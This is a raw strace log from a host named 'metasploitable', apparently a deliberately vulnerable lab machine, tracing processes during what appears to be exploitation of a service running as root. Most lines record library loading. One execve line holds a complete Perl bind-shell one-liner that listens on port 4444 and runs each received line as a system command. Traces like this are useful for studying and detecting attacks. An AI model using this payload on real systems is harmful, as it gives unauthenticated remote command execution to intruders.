12266 07:41:34.855572 open("/etc/ld.so.cache", O_RDONLY) = 1
12266 07:41:34.855584 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12266 07:41:34.855600 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f64000
12266 07:41:34.855610 close(1)          = 0
12266 07:41:34.855621 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12266 07:41:34.855635 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
12266 07:41:34.855649 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12266 07:41:34.855739 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
12266 07:41:34.855756 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7db4000
12266 07:41:34.855767 mmap2(0xb7dbc000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7dbc000
12266 07:41:34.855783 close(1)          = 0
12266 07:41:34.855796 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12266 07:41:34.855809 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
12266 07:41:34.855823 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12266 07:41:34.855956 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
12266 07:41:34.855988 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7da9000
12266 07:41:34.856000 mmap2(0xb7db2000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7db2000
12266 07:41:34.856015 close(1)          = 0
12266 07:41:34.856037 munmap(0xb7f64000, 29913) = 0
12266 07:41:34.856052 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
12266 07:41:34.856067 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
12266 07:41:34.856078 _llseek(1, 0, [0], SEEK_CUR) = 0
12266 07:41:34.856090 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
12266 07:41:34.856106 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f6b000
12266 07:41:34.856117 _llseek(1, 1624, [1624], SEEK_SET) = 0
12266 07:41:34.856131 munmap(0xb7f6b000, 1624) = 0
12266 07:41:34.856141 close(1)          = 0
12266 07:41:34.856169 getpgrp()         = 3831
12266 07:41:34.856179 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
12266 07:41:34.856194 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
12266 07:41:34.856210 brk(0x8101000)    = 0x8101000
12266 07:41:34.856241 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12266 07:41:34.856256 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12266 07:41:34.856271 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12266 07:41:34.856308 brk(0x8102000)    = 0x8102000
12266 07:41:34.856335 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12266 07:41:34.856353 stat64("/sbin/AB", 0xbf89fef8) = -1 ENOENT (No such file or directory)
12266 07:41:34.856365 stat64("/bin/AB", 0xbf89fef8) = -1 ENOENT (No such file or directory)
12266 07:41:34.856388 stat64("/usr/sbin/AB", 0xbf89fef8) = -1 ENOENT (No such file or directory)
12266 07:41:34.856401 stat64("/usr/bin/AB", 0xbf89fef8) = -1 ENOENT (No such file or directory)
12266 07:41:34.856414 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
12266 07:41:34.856429 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7ddf6f8) = 12267
12267 07:41:34.856474 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12267 07:41:34.856490 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
12267 07:41:34.856503 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
12267 07:41:34.856515 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
12267 07:41:34.856532 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12267 07:41:34.856548 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
12267 07:41:34.856560 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
12267 07:41:34.856615 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
12267 07:41:34.856629 --- SIGPIPE (Broken pipe) @ 0 (0) ---
12267 07:41:34.856695 exit_group(127)   = ?
12266 07:41:34.873510 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
4519  07:41:34.873528 waitpid(12266,  <unfinished ...>
12266 07:41:34.873555 <... rt_sigprocmask resumed> NULL, 8) = 0
12266 07:41:34.873561 --- SIGCHLD (Child exited) @ 0 (0) ---
12266 07:41:34.873574 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 12267
12266 07:41:34.873589 waitpid(-1, 0xbf89fb78, WNOHANG) = -1 ECHILD (No child processes)
12266 07:41:34.873599 sigreturn()       = ? (mask now [])
12266 07:41:34.873621 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
12266 07:41:34.873636 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12266 07:41:34.873646 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
12266 07:41:34.873663 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
12266 07:41:34.873680 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12266 07:41:34.873692 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
12266 07:41:34.873724 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12266 07:41:34.873743 stat64("/sbin/perl", 0xbf89ff28) = -1 ENOENT (No such file or directory)
12266 07:41:34.873755 stat64("/bin/perl", 0xbf89ff28) = -1 ENOENT (No such file or directory)
12266 07:41:34.873766 stat64("/usr/sbin/perl", 0xbf89ff28) = -1 ENOENT (No such file or directory)
12266 07:41:34.873777 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
12266 07:41:34.873795 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
12266 07:41:34.873818 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
12266 07:41:34.873832 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7ddf6f8) = 12268
12268 07:41:34.873875 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12268 07:41:34.873891 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
12268 07:41:34.873904 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
12268 07:41:34.873915 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
12268 07:41:34.873931 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12268 07:41:34.873946 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
12268 07:41:34.873970 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
12268 07:41:34.874049 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
12268 07:41:34.874145 brk(0)            = 0x8153000
12268 07:41:34.874164 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12268 07:41:34.874179 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f0f000
12268 07:41:34.874193 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
12268 07:41:34.874209 open("/etc/ld.so.cache", O_RDONLY) = 1
12268 07:41:34.874221 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12268 07:41:34.874237 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f07000
12268 07:41:34.874247 close(1)          = 0
12268 07:41:34.874258 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12268 07:41:34.874272 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
12268 07:41:34.874286 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
12268 07:41:34.874375 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
12268 07:41:34.874392 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f03000
12268 07:41:34.874403 mmap2(0xb7f05000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f05000
12268 07:41:34.874423 close(1)          = 0
12268 07:41:34.874434 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12268 07:41:34.874448 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
12268 07:41:34.874525 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
12268 07:41:34.874628 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
12268 07:41:34.874645 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ede000
12268 07:41:34.874656 mmap2(0xb7f01000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f01000
12268 07:41:34.874671 close(1)          = 0
12268 07:41:34.874683 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12268 07:41:34.874696 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
12268 07:41:34.874710 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
12268 07:41:34.874793 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
12268 07:41:34.874809 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7edd000
12268 07:41:34.874822 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ec5000
12268 07:41:34.874832 mmap2(0xb7ed9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7ed9000
12268 07:41:34.874846 mmap2(0xb7edb000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7edb000
12268 07:41:34.874859 close(1)          = 0
12268 07:41:34.874870 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12268 07:41:34.874883 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
12268 07:41:34.874897 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
12268 07:41:34.875055 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
12268 07:41:34.875074 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d76000
12268 07:41:34.875085 mmap2(0xb7ebf000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7ebf000
12268 07:41:34.875100 mmap2(0xb7ec2000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ec2000
12268 07:41:34.875126 close(1)          = 0
12268 07:41:34.875138 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12268 07:41:34.875151 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
12268 07:41:34.875165 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
12268 07:41:34.875252 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
12268 07:41:34.875268 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d44000
12268 07:41:34.875278 mmap2(0xb7d4d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d4d000
12268 07:41:34.875292 mmap2(0xb7d4f000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d4f000
12268 07:41:34.875305 close(1)          = 0
12268 07:41:34.875328 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d43000
12268 07:41:34.875340 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d438c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
12268 07:41:34.875396 mprotect(0xb7ebf000, 4096, PROT_READ) = 0
12268 07:41:34.875421 munmap(0xb7f07000, 29913) = 0
12268 07:41:34.875433 set_tid_address(0xb7d43908) = 12268
12268 07:41:34.875442 set_robust_list(0xb7d43910, 0xc) = 0
12268 07:41:34.875461 futex(0xbf9c0e60, 0x81 /* FUTEX_??? */, 1) = 0
12268 07:41:34.875502 rt_sigaction(SIGRTMIN, {0xb7ec92c0, [], SA_SIGINFO}, NULL, 8) = 0
12268 07:41:34.875516 rt_sigaction(SIGRT_1, {0xb7ec9340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
12268 07:41:34.875528 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
12268 07:41:34.875555 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
12268 07:41:34.875577 uname({sys="Linux", node="metasploitable", ...}) = 0
12268 07:41:34.875623 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
12268 07:41:34.875667 brk(0)            = 0x8153000
12268 07:41:34.875677 brk(0x8174000)    = 0x8174000
12268 07:41:34.875720 getuid32()        = 0
12268 07:41:34.875729 geteuid32()       = 0
12268 07:41:34.875738 getgid32()        = 0
12268 07:41:34.875746 getegid32()       = 0
12268 07:41:34.875781 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d22000
12268 07:41:34.875808 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
12268 07:41:34.875824 read(1, "\316\371z/", 4) = 4
12268 07:41:34.875837 close(1)          = 0
12268 07:41:34.875854 time(NULL)        = 1495626094
12268 07:41:34.875894 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbf9c0b30) = -1 ENOENT (No such file or directory)
12268 07:41:34.875911 stat64("/usr/local/lib/site_perl/5.8.8", 0xbf9c0b30) = -1 ENOENT (No such file or directory)
12268 07:41:34.875924 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbf9c0b30) = -1 ENOENT (No such file or directory)
12268 07:41:34.875939 stat64("/usr/local/lib/perl/5.8.7", 0xbf9c0c70) = -1 ENOENT (No such file or directory)
12268 07:41:34.875962 stat64("/usr/local/share/perl/5.8.7", 0xbf9c0c70) = -1 ENOENT (No such file or directory)
12268 07:41:34.876004 stat64("/usr/local/lib/perl/5.8.6", 0xbf9c0c70) = -1 ENOENT (No such file or directory)
12268 07:41:34.876016 stat64("/usr/local/share/perl/5.8.6", 0xbf9c0c70) = -1 ENOENT (No such file or directory)
